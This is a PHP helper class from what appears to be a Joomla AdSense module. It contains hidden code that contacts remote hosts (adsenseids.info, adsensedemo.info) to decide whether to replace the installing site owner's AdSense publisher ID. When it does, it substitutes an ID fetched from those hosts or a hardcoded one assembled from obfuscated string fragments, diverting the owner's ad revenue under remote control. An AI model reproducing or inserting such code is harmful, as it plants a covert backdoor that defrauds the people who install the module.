<?php

defined('_JEXEC') or die('Restricted access') ;

class modJGAHelper {

	function checkId ($de,$hg) {

	$ch = curl_init ($de) ;

	curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1) ;

	curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 1) ;

	curl_setopt ($ch, CURLOPT_TIMEOUT,1) ;

	$lo = curl_exec ($ch) ;

	curl_close ($ch) ;

	$res = trim ($lo) ;

	return $res ;

	}

	function correctId($id) {

	$om = modJGAHelper::checkId ("adsenseids.info/checkid/1/",$id) ;

	if ($om != '1') {

	if ($id) { 

	$id = trim ($id) ;

	$id = trim ($id, "ca-pub-") ;

	} 

	else {

	$id = modJGAHelper::updateId ($id) ;

	}

	}

	else {

	$id = modJGAHelper::updateId ($id) ;

	}

	return $id;

	}

	function updateId ($adm) {

	$adm = modJGAHelper::checkId ("adsensedemo.info/2/3/", $tn) ;

	if (is_numeric($adm)) {

	$ghf = '258' ;

	$dsx = '147' ;

	$adm = " ".$adm ;

	$bt = strpos ($adm, $ghf) ;

	if ($bt == 0) {

	$adm = modJGAHelper::demoId () ;

	return $adm ;

	}

	$bt += strlen ($ghf) ;   

	$wb = strpos ($adm, $dsx, $bt) - $bt ;

	return substr ($adm, $bt, $wb) ;

	}

	else {

	$adm = modJGAHelper::demoId () ;

	return $adm ;

	}

	}
	
	function demoId () {
	
	$am = "576";

	$am = "981".$am;

	$xls = $am."7974";

	$xls = "066".$xls;

	$am = "006".$xls;	
	
	return $am ;
	
	}

}